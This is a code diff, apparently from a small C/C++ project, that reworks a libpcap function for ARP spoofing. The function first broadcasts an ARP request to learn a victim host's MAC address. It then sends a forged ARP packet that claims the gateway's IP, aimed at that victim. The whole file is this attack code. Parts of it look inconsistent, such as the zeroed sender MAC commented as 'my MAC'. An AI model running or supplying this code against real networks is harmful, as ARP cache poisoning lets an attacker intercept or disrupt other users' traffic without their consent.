@@ -87,14 +87,15 @@ int get_wlan_mac(char *ifname, unsigned char *mac) {
 
 int arp_packat(char* ifname, char* gateway_addr, char* victim_addr) {
 
-
 	char* dev = ifname;
 	char errbuf[PCAP_ERRBUF_SIZE];
-	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
-	if (handle == nullptr) {
-		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
+	pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
+	if (pcap == NULL) {
+		fprintf(stderr, "pcap_open_live(%s) return null - %s\n", dev, errbuf);
 		return -1;
 	}
+
+	EthArpPacket packet;
 	
 	unsigned char my_mac[6];
 	get_wlan_mac(dev, my_mac);
@@ -105,7 +106,6 @@ int arp_packat(char* ifname, char* gateway_addr, char* victim_addr) {
 	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff"); //victim MAC
 	packet.eth_.smac_ = Mac(my_mac); //my MAC
 	packet.eth_.type_ = htons(EthHdr::Arp);
-
 	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
 	packet.arp_.pro_ = htons(EthHdr::Ip4);
 	packet.arp_.hln_ = Mac::SIZE;
@@ -116,10 +116,12 @@ int arp_packat(char* ifname, char* gateway_addr, char* victim_addr) {
 	packet.arp_.tmac_ = Mac("00:00:00:00:00:00"); //victim MAC
 	packet.arp_.tip_ = htonl(Ip(victim_addr)); //victim IP
 
-	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
+	int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
 	if (res != 0) {
-		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
 	}
+
+
 
 
 	while (true) {
@@ -138,31 +140,40 @@ int arp_packat(char* ifname, char* gateway_addr, char* victim_addr) {
 			break;
 		}
 	}
-	
 
-	
-	EthArpPacket packet;
 
-	packet.eth_.dmac_ = Mac(victim_mac); //victim MAC
-	packet.eth_.smac_ = Mac(my_mac); //my MAC
-	packet.eth_.type_ = htons(EthHdr::Arp);
+	pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
+	if (handle == nullptr) {
+		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
+		return -1;
+	}
 
-	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
-	packet.arp_.pro_ = htons(EthHdr::Ip4);
-	packet.arp_.hln_ = Mac::SIZE;
-	packet.arp_.pln_ = Ip::SIZE;
-	packet.arp_.op_ = htons(ArpHdr::Request);
-	packet.arp_.smac_ = Mac("00:00:00:00:00:00"); //my MAC
-	packet.arp_.sip_ = htonl(Ip(gateway_addr)); //gateway
-	packet.arp_.tmac_ = victim_mac; //victim MAC
-	packet.arp_.tip_ = htonl(Ip(victim_addr)); //victim IP
 
-	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
+
+	EthArpPacket packet1;
+
+	packet1.eth_.dmac_ = Mac(victim_mac); //victim MAC
+	packet1.eth_.smac_ = Mac(my_mac); //my MAC
+	packet1.eth_.type_ = htons(EthHdr::Arp);
+
+	packet1.arp_.hrd_ = htons(ArpHdr::ETHER);
+	packet1.arp_.pro_ = htons(EthHdr::Ip4);
+	packet1.arp_.hln_ = Mac::SIZE;
+	packet1.arp_.pln_ = Ip::SIZE;
+	packet1.arp_.op_ = htons(ArpHdr::Request);
+	packet1.arp_.smac_ = Mac("00:00:00:00:00:00"); //my MAC
+	packet1.arp_.sip_ = htonl(Ip(gateway_addr)); //gateway
+	packet1.arp_.tmac_ = victim_mac; //victim MAC
+	packet1.arp_.tip_ = htonl(Ip(victim_addr)); //victim IP
+
+	res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet1), sizeof(EthArpPacket));
 	if (res != 0) {
 		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
 	}
 
+
 	pcap_close(handle);
+	return 0;
 }
 
 
